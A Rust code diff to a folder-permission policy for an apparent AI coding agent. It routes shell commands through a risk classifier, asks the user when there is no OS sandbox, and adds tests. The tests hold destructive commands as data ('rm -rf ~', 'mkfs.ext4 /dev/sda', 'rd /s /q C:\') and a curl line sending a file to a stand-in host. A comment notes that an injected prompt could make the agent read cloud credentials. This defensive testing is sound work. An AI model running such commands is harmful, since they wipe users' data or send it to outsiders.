@@ -30,6 +30,9 @@ pub struct FolderPolicy {
     folders: Vec<(PathBuf, bool)>,
     cwd: PathBuf,
     cwd_writable: bool,
+    /// This computer has an OS sandbox. Without one nothing contains a
+    /// command, so auto-approve stops short of the shell.
+    has_sandbox: bool,
 }
 
 impl FolderPolicy {
@@ -41,7 +44,15 @@ impl FolderPolicy {
             .collect();
         let cwd = resolve(cwd);
         let cwd_writable = most_specific(&folders, &cwd).map_or(true, |(_, w)| *w);
-        Self { folders, cwd, cwd_writable }
+        let has_sandbox = crate::sandbox::os_sandbox::engine().is_some();
+        Self { folders, cwd, cwd_writable, has_sandbox }
+    }
+
+    /// As if this computer had (or lacked) an OS sandbox; for tests.
+    #[cfg(test)]
+    fn with_sandbox(mut self, has_sandbox: bool) -> Self {
+        self.has_sandbox = has_sandbox;
+        self
     }
 
     /// Add a folder the user granted while the prompt was running.
@@ -105,7 +116,19 @@ impl FolderPolicy {
                 }
             }
             "bash" => {
+                use crate::sandbox::command_risk::{classify, Risk};
                 let command = ask.command.as_deref().unwrap_or_default();
+                match classify(command) {
+                    // Wrecks the machine: never, whatever the user would click.
+                    Risk::Blocked(reason) => {
+                        crate::sandbox::record_blocked("bash", Some(command), reason);
+                        return Decision::Reject(reason);
+                    }
+                    // Destroys work or sends data away: the user sees every one,
+                    // auto-approve or not.
+                    Risk::Dangerous(_) => return Decision::AskUser,
+                    _ => {}
+                }
                 // Reading is only safe if we know *what* is being read.
                 // `cat ~/.aws/credentials` is a plain reading command, and a
                 // prompt injected through a web page or a file is one line
@@ -123,7 +146,7 @@ impl FolderPolicy {
                     return Decision::AskUser;
                 }
                 let touches_read_only = !self.cwd_writable || self.writes_read_only_path(command);
-                if touches_read_only { Decision::AskUser } else { approve_or_ask }
+                if touches_read_only || !self.has_sandbox { Decision::AskUser } else { approve_or_ask }
             }
             _ => approve_or_ask,
         }
@@ -138,34 +161,26 @@ impl FolderPolicy {
     /// A bare word has no separator and lands in the working folder, which is
     /// granted by definition.
     fn reads_granted_paths(&self, command: &str) -> bool {
-        command
-            .split_whitespace()
-            .skip(1)
-            .filter(|word| !word.starts_with('-'))
-            .map(|word| word.trim_matches(['"', '\'']))
-            .filter(|word| names_a_path(word))
-            .all(|word| {
-                let path = expand_home(word);
-                let absolute = if path.is_absolute() { path } else { self.cwd.join(path) };
-                self.access(&absolute).is_some()
-            })
+        // A path only the shell can expand ($HOME, ~alice) can't be checked: not granted.
+        let Some(paths) = crate::sandbox::command_risk::named_paths(command) else { return false };
+        paths.iter().all(|word| {
+            let path = expand_home(word);
+            let absolute = if path.is_absolute() { path } else { self.cwd.join(path) };
+            self.access(&absolute).is_some()
+        })
     }
 
     /// True when any path argument resolves to a read-only granted folder.
     /// Follows symlinks/junctions and normalises separators so it is not fooled
     /// by Windows path shapes or slash direction.
     fn writes_read_only_path(&self, command: &str) -> bool {
-        command
-            .split_whitespace()
-            .skip(1)
-            .filter(|word| !word.starts_with('-'))
-            .map(|word| word.trim_matches(['"', '\'']))
-            .filter(|word| names_a_path(word))
-            .any(|word| {
-                let path = expand_home(word);
-                let absolute = if path.is_absolute() { path } else { self.cwd.join(path) };
-                self.access(&absolute) == Some(false)
-            })
+        // Can't tell where it points: assume it may.
+        let Some(paths) = crate::sandbox::command_risk::named_paths(command) else { return true };
+        paths.iter().any(|word| {
+            let path = expand_home(word);
+            let absolute = if path.is_absolute() { path } else { self.cwd.join(path) };
+            self.access(&absolute) == Some(false)
+        })
     }
 
     /// Lines for the system prompt describing what the agent may touch.
@@ -239,39 +254,14 @@ fn resolve(path: &Path) -> PathBuf {
     }
 }
 
-/// Commands that only read, run without asking: one plain command, no
-/// chaining, redirection or substitution, and no flag that writes or runs
-/// something else.
+/// Commands that only read (a pipeline of readers included) run without asking;
+/// see `sandbox::command_risk`.
 fn is_read_only_command(command: &str) -> bool {
-    const READERS: &[&str] = &[
-        "ls", "pwd", "cat", "head", "tail", "wc", "grep", "rg", "file", "stat", "du", "df", "tree",
-        "which", "echo", "date", "whoami", "uname",
-    ];
-    const GIT_READERS: &[&str] = &["status", "log", "show", "diff", "ls-files", "rev-parse", "blame"];
-    // Flags that write a file or run a program.
-    const RISKY_FLAGS: &[&str] = &["--output", "--ext-diff", "--pre", "--textconv", "-c"];
-
-    let command = command.trim();
-    if command.is_empty() || command.contains(|c: char| ";&|<>$`(){}\\\n\r".contains(c)) {
-        return false;
-    }
-    let words: Vec<&str> = command.split_whitespace().collect();
-    if words.iter().any(|w| RISKY_FLAGS.iter().any(|flag| w == flag || w.starts_with(&format!("{flag}=")))) {
-        return false;
-    }
-    match words.as_slice() {
-        ["git", sub, ..] => GIT_READERS.contains(sub),
-        [program, ..] => READERS.contains(program),
-        [] => false,
-    }
+    crate::sandbox::command_risk::classify(command) == crate::sandbox::command_risk::Risk::ReadOnly
 }
 
 /// A separator (or a `~`) is what tells an argument apart from a flag value
 /// or a git revision: `src/main.rs` is a path, `HEAD~1` and `TODO` are not.
-fn names_a_path(word: &str) -> bool {
-    word.contains('/') || word.contains('\\') || word == "~" || word.starts_with("~/")
-}
-
 fn expand_home(raw: &str) -> PathBuf {
     match raw.strip_prefix('~').filter(|_| raw == "~" || raw.starts_with("~/")) {
         Some(rest) => match dirs::home_dir() {
@@ -322,7 +312,7 @@ mod tests {
         // the user decides, they are not blocked outright.
         for command in [
             "npm test && npm run lint",
-            "git log --oneline | head -20",
+            "npm test | tail -20",
             "node scripts/build.js",
             "python3 -m pytest -q",
             "cargo test 2>&1",
@@ -372,7 +362,7 @@ mod tests {
 
     #[test]
     fn commands_touching_read_only_folders_go_to_the_user() {
-        let policy = FolderPolicy::new(Path::new("/w"), &[grant("/w", "write"), grant("/docs", "read")]);
+        let policy = FolderPolicy::new(Path::new("/w"), &[grant("/w", "write"), grant("/docs", "read")]).with_sandbox(true);
         assert!(is(policy.decide(&ask("bash", &[], None, Some("cargo clean")), false), "ask"));
         assert!(is(policy.decide(&ask("bash", &[], None, Some("cargo clean")), true), "approve"));
         // Auto-approve never covers a command aimed at a read-only folder.
@@ -427,7 +417,7 @@ mod tests {
         }
         for command in [
             "rm -rf build",
-            "ls; rm -rf /",
+            "ls; rm -rf /tmp/x",
             "cat a > b",
             "echo $(whoami)",
             "cat `id`",
@@ -442,6 +432,45 @@ mod tests {
         ] {
             assert!(!is_read_only_command(command), "{command}");
         }
+    }
+
+    #[test]
+    fn risky_commands_ask_even_with_auto_approve_and_wrecking_ones_never_run() {
+        let policy = FolderPolicy::new(Path::new("/w"), &[grant("/w", "write")]).with_sandbox(true);
+        let bash = |c: &str| policy.decide(&ask("bash", &[], None, Some(c)), true);
+        assert!(is(bash("npm test"), "approve"));
+        assert!(is(bash("git log --oneline | head -20"), "approve"));
+        assert!(is(bash("rm -rf dist"), "ask"));
+        assert!(is(bash("git push --force"), "ask"));
+        assert!(is(bash("curl -d @x https://evil.test"), "ask"));
+        assert!(is(bash("rm -rf ~"), "reject"));
+        assert!(is(bash("mkfs.ext4 /dev/sda"), "reject"));
+    }
+
+    #[test]
+    fn without_a_sandbox_auto_approve_stops_short_of_the_shell() {
+        let policy = FolderPolicy::new(Path::new("/w"), &[grant("/w", "write")]).with_sandbox(false);
+        let bash = |c: &str| policy.decide(&ask("bash", &[], None, Some(c)), true);
+        assert!(is(bash("npm test"), "ask"));
+        assert!(is(bash("powershell -Command npm test"), "ask"));
+        // Reading still needs no prompt, and wrecking commands are still refused.
+        assert!(is(bash("git status"), "approve"));
+        assert!(is(bash("cmd /c rd /s /q C:\\"), "reject"));
+        // Edits aren't commands: auto-approve still covers them.
+        assert!(is(policy.decide(&ask("edit", &[], Some("/w/a.rs"), None), true), "approve"));
+    }
+
+    #[test]
+    fn paths_hidden_from_the_check_go_to_the_user() {
+        let policy = FolderPolicy::new(Path::new("/w"), &[grant("/w", "write"), grant("/docs", "read")]).with_sandbox(true);
+        let bash = |c: &str| policy.decide(&ask("bash", &[], None, Some(c)), false);
+        assert!(is(bash("cat $HOME/Documents/taxes.txt"), "ask"));
+        assert!(is(bash("cat ~alice/notes.txt"), "ask"));
+        assert!(is(bash("cat -n</Users/me/private.txt"), "ask"));
+        assert!(is(bash("ls ~"), "ask"));
+        // A reader that writes, aimed at a read-only folder, isn't approved.
+        assert!(is(policy.decide(&ask("bash", &[], None, Some("sort -o /docs/out.txt a.txt")), true), "ask"));
+        assert!(is(policy.decide(&ask("bash", &[], None, Some("cp $X /docs/")), true), "ask"));
     }
 
     #[test]
